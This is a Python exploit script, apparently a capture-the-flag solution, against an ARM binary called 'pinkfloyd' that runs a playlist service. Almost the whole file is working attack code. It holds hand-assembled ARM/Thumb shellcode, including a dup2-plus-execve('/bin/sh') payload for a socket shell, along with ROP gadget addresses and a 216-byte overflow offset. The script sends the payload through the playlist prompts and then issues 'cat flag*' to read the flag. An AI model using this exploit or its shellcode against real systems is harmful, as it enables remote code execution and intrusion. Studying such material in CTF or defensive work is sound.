#!/usr/bin/env python3

import socket
import time
import struct
import sys
import code

target = "pi" if len(sys.argv) <= 1 else sys.argv[1]
host_port = {
    "remote": ("52.72.171.221", 9981),
    "pi": ("192.168.1.100", 9981),
    "local": ("127.0.0.1", 9981)
}
pattern300 = b"""Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9"""
# error at: 0x41326840 but arm so 0x41326841
# position 216 in pattern


def p(d):
    return struct.pack("<I", d)

def H(d):
	return struct.pack("<H", d)

def sleep(t=0):
    print("sleep")
    time.sleep(t)
    print("sleeped %d" % t)

# ---- ADDR :
no_care = 0x42424242
# same addr from nm, gdb, objdump because staticaly linked
exit = 0xF870
puts = 0x10f50
printf = 0x10798
stack_trace = 0x8170

# arm-linux-objdump -d pinkfloyd  > pinkfloyd.s
# cat pinkfloyd.s | grep "pop.*r0.*pc" -B 4
# pop_r0_r4_pc = 0x1fbe0
pop_r0_r4_pc = 0x1f834

# addr_buffer2 = 0x7efff954

# recv_buffer = 0xf6ffea04 # local
recv_buffer = 0x7efff4a4 # pi
malloc_buffer = 0x8f830
malloc_buffer += 4 * 4 # pass no slide
# pi
# addr_buffer = 0x7ebd48a4
# addr_buffer2 = 0x7eed7924

# 0x7ee39924
# 0x7ed07924
# 0x7e98e924
# 0x7ed6c924
#
# exit shellcode
#    8070:   e3a07001    mov r7, #1  ; 0x1
#    8074:   ef000000    svc 0x00000000
exit_shellcode = b''.join([
    p(0xe3a07001),
    p(0xef000000)
])

write_shellcode = b''.join([
    p(0xe3a02010),
    p(0xe1a0100f),
    p(0xe2811018),
    p(0xe3a00004),
    p(0xe3a07004),
    p(0xef000000),
    p(0xe0400000),
    p(0xe3a07001),
    p(0xef000000),
    p(0x6c656873),
    p(0x74732d6c),
    p(0x2e6d726f),
    p(0x0a67726f),
])

write_shellcode_no_0x00 = b''.join([
    p(0xe1a01001) * 17, #    mov r1, r1 # nop slide :)
	p(0xe28f6001), #   	add	r6, pc, #1
	p(0xe12fff16), #   	bx	r6
	H(0x2210), #    	movs	r2, #16
	H(0x4679), #    	mov	r1, pc
	H(0x310e), #    	adds	r1, #14
	H(0x2004), #    	movs	r0, #1 #  fd
	H(0x2704), #    	movs	r7, #4
	H(0xdf01), #    	svc	1
	H(0x1b24), #    	subs	r4, r4, r4
	H(0x1c20), #    	adds	r0, r4, #0
	H(0x2701), #    	movs	r7, #1
	H(0xdf01), #    	svc	1
	p(0x6c656873), #   	.word	0x6c656873
	p(0x74732d6c), #   	.word	0x74732d6c
	p(0x2e6d726f), #   	.word	0x2e6d726f
	p(0x0a67726f), #   	.word	0x0a67726f
])

execve_shellcode = b''.join([
    p(0xe1a01001) * 17, #    mov r1, r1 # nop slide :)
    p(0xe28f3001), 	# add	r3, pc, #1
    p(0xe12fff13), 	# bx	r3


	H(0x2004),      # movs	r0, #4
	H(0x1a49),      # subs	r1, r1, r1
	H(0x273f),      # movs	r7, #63	; 0x3f
	H(0xdf01),      # svc	1
	H(0x3101),      # adds	r1, #1
	H(0x2903),      # cmp	r1, #3
	H(0xd1fa),      # bne.n	1bc <dup2_loop>


	H(0x4678),  	# mov	r0, pc
	H(0x300e),      # adds    r0, #14
	H(0x1a92),      # subs    r2, r2, r2
	H(0x6082),      # str r2, [r0, #8]

	H(0x9001),  	# str	r0, [sp, #4]
	H(0xa901),  	# add	r1, sp, #4
	H(0x1a92),  	# subs	r2, r2, r2
	H(0x270b),  	# movs	r7, #11
	H(0xdf01),  	# svc	1
	H(0x2f2f),  	# .short	0x2f2f
	p(0x2f6e6962), 	# .word	0x2f6e6962
	p(0x46c06873) 	# .word	0x46c06873 sh
	# p(0x46c0736c) 	# .word	0x46c06873 ls
	# p(0x46c06469) 	# .word	0x46c06873 ls
])

shellcode = execve_shellcode + b"\x00"
# shellcode = write_shellcode_no_0x00

open("test.bin", "wb").write(shellcode)
#
s = socket.socket()
s.connect(host_port[target])

# pass until prompt
while True:
	data = s.recv(1024).decode()
	print(data)
	if "playlist$>" in data or len(data) == 0:
		break

s.send(b"create\n")  # cmd

print(s.recv(1024).decode())  # Enter playlist name:
# s.send(b"test\n")
s.send(shellcode + b"\n")
# s.send(b"t" * 235 + b"\n")
# s.send(pattern300 + b"\n")
# s.send(b"sal\x00u\nt\n")
# s.send(b"*"*216 + b"ABCD" + b"\n")
# s.send(b"*"*216 + p(exit) + b"\n")
# s.send(b"*"*216 +
#       p(pop_r0_r4_pc) + b"A" * 42 + b"\n")
# this dont work because strip at \x00 \x0a \x0d \x20
# s.send(b"*"*216 +
#        p(pop_r0_r4_pc) + p(recv_buffer) + p(no_care) +
#        p(puts) +
#        p(exit) * 2 + b"\n")
# s.send(b"*"*216 + p(recv_buffer) + b"\n")
print(s.recv(1024).decode())  # Enter tags


# s.send(b"A"*88 + p(recv_buffer)  + b"\n")
s.send(b"A"*88 + p(malloc_buffer)  + b"\n")

print(s.recv(1024).decode())  # Enter max songs
# s.send(b"TTTTTTTT" + b"\n")
s.send(b"this is the max songs param I dont care" + b"\n")

s.send(b"ls\npwd\ncat flag*\n")
#
print(s.recv(1024))  # prompt
print(s.recv(1024))  # prompt


# class sw: # socket wrapper
#     def __init__(self, s):
#         self.s = s
#     def read(self, len):
#             return self.s.recv(len)
#     def write(self, str):
#             return self.s.send(str)
#     def readline(self):
#             return self.read(256) # lazy implementation for quick testing
# s = sw(s)
# sys.stdin = s
# sys.stdout = s
# sys.stderr = s
# code.interact() # runs the interactive console
